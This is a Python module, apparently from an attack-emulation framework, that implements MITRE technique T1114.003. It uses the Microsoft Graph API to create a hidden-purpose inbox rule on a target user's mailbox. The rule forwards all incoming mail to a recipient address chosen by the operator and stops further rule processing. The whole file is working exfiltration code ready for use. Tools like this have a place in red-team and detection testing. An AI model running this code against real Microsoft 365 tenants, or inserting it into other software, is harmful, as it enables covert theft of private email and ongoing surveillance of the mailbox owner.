from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.graph_request import GraphRequest

@TechniqueRegistry.register
class M365DeployEmailFrwdRule(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1114.003",
                technique_name="Email Collection",
                tactics=["Collection"],
                sub_technique_name="Email Forwarding Rule"
            )
        ]
        super().__init__("Deploy Email Forwarding Rule", "Sets up email forwarding rule on target user mailbox", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)

        try:
            user_id: str = kwargs.get('user_id', None)
            recipient_name: str = kwargs.get('recipient_name', None)
            recipient_address: str = kwargs.get('recipient_address', None)
            rule_name: str = kwargs.get('rule_name', None)

            if rule_name in [None, ""] or  user_id in [None, ""] or  recipient_name in [None, ""] or  recipient_address in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": {"Error" : "Invalid Technique Input"},
                    "message": {"Error" : "Invalid Technique Input"}
                }

            endpoint_url = f"https://graph.microsoft.com/v1.0/users/{user_id}/mailFolders/inbox/messageRules"
            
            # Create request payload
            data = {
                "displayName": rule_name,
                "sequence": 3,
                "isEnabled": "true", 
                "conditions": {
                    "sentToMe": "true"
                },
                "actions": {
                    "forwardTo": [
                        {
                            "emailAddress": {
                                "name": recipient_name,
                                "address": recipient_address
                            }
                        }
                    ],
                    "stopProcessingRules": 'true'
                }
            }
            
            raw_response = GraphRequest().post(url = endpoint_url, data = data)

            # Request successful
            if 200 <= raw_response.status_code < 300:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully deployed email forwarding rule on mailbox",
                    "value": {
                        'rule_name' : rule_name,
                        'rule_id' : raw_response.json().get('id', 'N/A'),
                        'rule_enabled' : raw_response.json().get('isEnabled', 'N/A'),
                        'conditions' : raw_response.json().get('conditions', 'N/A'),
                        'actions' : raw_response.json().get('actions', 'N/A'),
                        'sequence' : raw_response.json().get('sequence', 'N/A'),
                    }
                }
            else:
                return ExecutionStatus.FAILURE, {
                    "error": {
                        "error_code": raw_response.json().get('error').get('code', 'N/A'),
                        "eror_message": raw_response.json().get('error').get('message', 'N/A')
                    },
                    "message": "Failed to deploy email forwarding rule on mailbox"
                }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to deploy email forwarding rule on mailbox"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "user_id": {
                "type": "str", 
                "required": True, 
                "default":None, 
                "name": "Forwarding Mailbox", 
                "input_field_type" : "email"
            },
            "recipient_name": {
                "type": "str", 
                "required": True, 
                "default":None, 
                "name": "Recipient Name", 
                "input_field_type" : "text"
            },
            "recipient_address": {
                "type": "str", 
                "required": True, 
                "default":None, 
                "name": "Recipient Mailbox", 
                "input_field_type" : "email"
            },
            "rule_name": {
                "type": "str", 
                "required": True, 
                "default":None, 
                "name": "New Rule Name", 
                "input_field_type" : "text"
            }
        }